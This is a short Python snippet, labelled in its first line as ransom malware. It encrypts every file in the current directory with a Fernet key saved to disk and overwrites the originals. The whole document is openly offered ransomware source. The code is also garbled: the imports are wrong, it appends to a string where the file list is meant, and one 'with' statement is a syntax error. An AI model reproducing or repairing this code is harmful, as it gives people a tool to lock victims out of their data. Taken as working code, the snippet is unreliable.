# Create a ransom malware pyth python:
import os
import cryptography.fernet 
import Fernet

files = []

for file in os.listdir():
    if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        file.append(file)
print(files)

key = Fernet.generate_key()
with open("thekey.key", "wb") as thekey:
    thekey.write(key)
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as the thefile:
            thefile.write(contents_encrypted)
        # use the command cat the file
        # cat thekey.key
        